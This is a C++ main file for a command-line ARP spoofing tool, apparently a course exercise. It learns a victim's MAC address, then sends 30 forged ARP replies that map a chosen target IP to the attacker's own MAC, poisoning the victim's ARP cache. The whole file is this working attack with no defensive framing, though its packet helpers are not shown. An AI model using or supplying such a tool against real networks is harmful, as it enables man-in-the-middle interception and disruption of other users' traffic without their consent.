#include "arpctl.h"
#include "infinfo.h"
#include "packet.h"
#include <iostream>

int main(int argc, char *argv[])
{
    if (argc != 4) {
        std::cout << "Usage: sudo " << argv[0] << " <interface> <sender ip> <target ip>"
                  << std::endl;
        return 1;
    }

    const char *interface = argv[1];

    uint32_t inet_tmp = inet_addr(argv[2]);
    uint8_t sender_ip[4];
    memcpy(sender_ip, &inet_tmp, 4);

    inet_tmp = inet_addr(argv[3]);
    uint8_t target_ip[4];
    memcpy(target_ip, &inet_tmp, 4);

    uint8_t my_mac[MAC_LEN] = {0};
    uint8_t my_ip[IP_LEN] = {0};
    getMac(interface, my_mac);
    getIP(interface, my_ip);

    uint8_t sender_mac[6] = {0};
    send_arp(interface,
             BROADCAST_MAC,
             my_mac,
             my_mac,
             my_ip,
             UNKNOWN_MAC,
             sender_ip,
             ARP_OPCODE_REQ,
             sender_mac);
    for (int i = 1; i <= 30; i++) {
        std::cout << "ARP Spoofing: " << i << std::endl;
        send_arp(interface,
                 sender_mac,
                 my_mac,
                 my_mac,
                 target_ip,
                 sender_mac,
                 sender_ip,
                 ARP_OPCODE_REP);
        sleep(1);
    }
}
